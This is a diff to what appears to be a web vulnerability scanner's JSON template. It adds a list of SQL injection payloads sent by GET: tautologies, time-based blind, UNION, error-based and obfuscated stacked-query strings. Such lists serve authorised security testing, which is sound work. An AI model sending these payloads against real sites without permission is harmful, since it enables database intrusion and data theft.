@@ -41,6 +41,81 @@
         "value": "1' AND '1'='1",
         "encoding": "none",
         "method": "GET"
+      },
+      {
+        "value": "' OR 'x'='x",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "') OR ('1'='1",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "' OR SLEEP(5)--",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "1' WAITFOR DELAY '0:0:5'--",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "' OR 1=1/*",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "'||'1'='1",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "' OR '1'='1'/*",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "admin'/**/--",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "' UNION ALL SELECT NULL,NULL--",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "' AND EXTRACTVALUE(1,CONCAT(0x5c,VERSION()))--",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))--",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "';DECLARE/**/@@x/**/varchar(8000)=';EXEC/**/@@x--",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "' AND ASCII(SUBSTRING((SELECT/**/@@version),1,1))>51--",
+        "encoding": "none",
+        "method": "GET"
       }
     ],
     "matchers": [
